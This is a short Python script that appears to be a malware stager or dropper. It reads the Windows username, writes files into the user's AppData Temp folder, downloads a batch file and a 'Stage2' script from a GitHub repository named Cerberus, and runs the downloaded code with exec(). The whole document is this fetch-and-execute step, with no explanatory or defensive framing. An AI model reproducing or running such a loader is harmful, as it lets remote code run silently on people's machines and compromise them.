import os.path
import urllib.request
from bs4 import BeautifulSoup

x = os.getlogin()

path = ("/Users/" + str(os.getlogin()) + "/AppData/Local/Temp/Stage1.py")
filename = ("/Users/" + str(os.getlogin()) + "/AppData/Local/Temp/THost.bat")

if os.path.isfile(path) == False:
    file = open('Stage2.py', 'a')
    file.close()

if os.path.isfile(filename) == False:
    file = open('THost.bat', 'a')
    file.close()

with urllib.request.urlopen("https://raw.githubusercontent.com/paramkudle/Cerberus/main/TSource1.txt") as response:
    data = response.read().decode("utf-8")
    with open(filename, "a+") as fp: fp.write(data)

urllib.request.urlretrieve("https://raw.githubusercontent.com/paramkudle/Cerberus/main/Stage2Source.txt", path)

exec(open(path).read())
